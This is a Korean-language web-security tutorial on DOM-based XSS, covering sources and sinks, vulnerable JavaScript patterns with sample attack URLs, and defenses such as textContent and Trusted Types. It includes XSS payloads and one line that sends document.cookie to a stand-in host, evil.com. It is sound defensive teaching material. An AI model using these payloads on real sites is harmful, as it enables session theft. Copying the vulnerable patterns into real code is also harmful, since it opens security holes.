---
title: "DOM 기반 XSS: 서버를 거치지 않는 클라이언트 사이드 공격"
description: "서버 로그에도 남지 않는 DOM 기반 XSS의 Source-Sink 모델, 위험한 DOM API 목록, Trusted Types와 textContent를 활용한 방어법을 상세히 설명합니다."
author: "PALDYN Team"
pubDate: "2026-06-04"
archiveOrder: 3
type: "knowledge"
category: "Security"
tags: ["XSS", "DOM XSS", "웹 보안", "Trusted Types", "innerHTML", "JavaScript"]
featured: false
draft: false
---

[지난 글](/posts/websec-xss-stored/)에서 DB에 저장된 스크립트가 모든 방문자에게 실행되는 저장형 XSS를 살펴봤습니다. 이번에 다룰 **DOM 기반 XSS(DOM-based XSS)**는 기존 두 유형과 근본적으로 다릅니다. 악성 코드가 서버를 전혀 거치지 않고, 브라우저 안의 JavaScript가 URL이나 기타 소스에서 직접 읽은 값을 위험한 DOM API에 넘기면서 발생합니다.

## DOM 기반 XSS의 특수성

반사형·저장형 XSS는 서버가 악성 스크립트를 HTML 응답에 포함시킵니다. 하지만 DOM 기반 XSS에서는 서버의 응답 자체는 완전히 정상입니다. 취약점은 그 응답에 포함된 JavaScript 코드가 `location.hash`, `location.search`, `document.referrer` 같은 소스에서 값을 읽어 `innerHTML`, `eval()`, `document.write()` 같은 위험한 sink에 그대로 넘길 때 발생합니다.

이 때문에 서버 쪽 WAF나 IDS로는 탐지가 거의 불가능하고, 서버 로그에도 페이로드가 남지 않습니다.

![DOM 기반 XSS: 서버를 거치지 않는 공격](/assets/posts/websec-xss-dom-based-flow.svg)

## Source-Sink 모델

DOM XSS를 이해하는 핵심 개념은 **Source(오염 소스)**와 **Sink(실행 지점)**입니다.

**Source**: 공격자가 제어 가능한 데이터 입력 지점입니다.

```javascript
// 주요 Source 목록
location.search       // URL 쿼리 파라미터: ?key=value
location.hash         // URL 해시: #fragment
location.href         // 전체 URL
document.referrer     // 이전 페이지 URL
localStorage / sessionStorage
postMessage 수신 데이터
window.name
document.cookie       // 쿠키 (제한적으로)
```

**Sink**: 데이터가 도착했을 때 스크립트 실행을 유발할 수 있는 위험한 API입니다.

```javascript
// 위험한 Sink 목록
element.innerHTML = userInput;      // HTML 파싱하며 스크립트 실행
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);
eval(userInput);                    // 직접 실행
setTimeout(userInput, 0);           // 문자열 형태면 eval과 동일
setInterval(userInput, 0);
new Function(userInput)();
element.setAttribute('onclick', userInput); // 이벤트 핸들러
location.href = userInput;          // javascript: 프로토콜
location.assign(userInput);
location.replace(userInput);
$.html(userInput);                  // jQuery
$(userInput);                       // jQuery 선택자 형태
```

## 실제 취약한 코드 패턴

```javascript
// 패턴 1: URL 파라미터를 innerHTML에 삽입
const name = new URLSearchParams(location.search).get('name');
document.querySelector('#greeting').innerHTML = `안녕, ${name}!`;
// 공격 URL: /page?name=<img src=x onerror=alert(1)>

// 패턴 2: 해시를 document.write에 사용
const tab = location.hash.slice(1);
document.write('<script src="/tabs/' + tab + '.js"><\/script>');
// 공격 URL: /page#"><script>alert(1)</script>

// 패턴 3: jQuery를 이용한 DOM 조작
const search = location.search.substring(1);
$('body').append('<div>' + search + '</div>');
// 공격 URL: /page?<img src=x onerror=alert(1)>

// 패턴 4: eval로 동적 코드 실행
const op = location.hash.slice(1);
eval('showPanel("' + op + '")');
// 공격 URL: /page#"); alert(1); //
```

## 방어 전략

![DOM XSS 방어: Sink를 안전하게 대체하기](/assets/posts/websec-xss-dom-based-defense.svg)

**1. 위험한 Sink를 안전한 API로 교체**가 가장 근본적인 방어입니다:

```javascript
// ❌ 위험
element.innerHTML = userInput;

// ✅ 안전 — 텍스트로만 삽입 (HTML 파싱 없음)
element.textContent = userInput;

// ✅ 안전 — DOM API로 노드 생성
const text = document.createTextNode(userInput);
element.appendChild(text);
```

URL을 다루는 경우 `javascript:` 프로토콜을 차단합니다:

```javascript
function safeRedirect(url) {
  // 허용된 프로토콜만 사용
  if (!url.startsWith('https://') && !url.startsWith('/')) {
    throw new Error('허용되지 않은 URL');
  }
  location.href = url;
}
```

**2. Trusted Types API**는 브라우저 레벨에서 위험한 Sink에 대한 타입 검사를 강제합니다:

```javascript
// Trusted Types 정책 등록
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScriptURL: (url) => {
      if (url.startsWith('https://cdn.myapp.com/')) return url;
      throw new Error('신뢰할 수 없는 script URL');
    }
  });

  // 이제 innerHTML에는 반드시 policy.createHTML()을 통한 값만 사용 가능
  element.innerHTML = policy.createHTML(userInput);
}
```

CSP 헤더로 Trusted Types를 강제하면 정책 없이 innerHTML에 문자열을 직접 할당하면 브라우저가 차단합니다:

```http
Content-Security-Policy: require-trusted-types-for 'script'
```

**3. 정적 분석 도구** 활용으로 코드베이스 내 위험한 패턴을 자동으로 찾습니다:

```bash
# ESLint + eslint-plugin-no-unsanitized
npm install --save-dev eslint-plugin-no-unsanitized

# 또는 Semgrep으로 innerHTML 사용 스캔
semgrep --config=p/javascript-xss .

# Burp Suite의 DOM Invader 확장으로 런타임 탐지
```

## Hash 기반 XSS의 특수한 위험성

`location.hash`는 서버로 전송되지 않아 서버 로그에 절대 남지 않습니다. 전통적인 모니터링 시스템이 완전히 무력화됩니다:

```javascript
// 서버 로그에 페이로드가 남지 않음
// /page#<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>

// 안전한 hash 처리
const hash = location.hash.slice(1);
const allowedTabs = ['home', 'profile', 'settings'];
if (allowedTabs.includes(hash)) {
  showTab(hash); // 화이트리스트 검증 후 사용
}
```

DOM 기반 XSS는 세 가지 XSS 유형 중 탐지와 방어가 가장 어렵습니다. 클라이언트 코드에 대한 정기적인 정적 분석과 Trusted Types 같은 브라우저 최신 보안 기능 채택이 핵심 대응 방안입니다.

---

**지난 글:** [Stored XSS: 저장형 크로스사이트 스크립팅의 위험성과 방어](/posts/websec-xss-stored/)

**다음 글:** [CSRF: 사이트 간 요청 위조 공격의 원리와 방어](/posts/websec-csrf/)

<br>
읽어주셔서 감사합니다. 😊
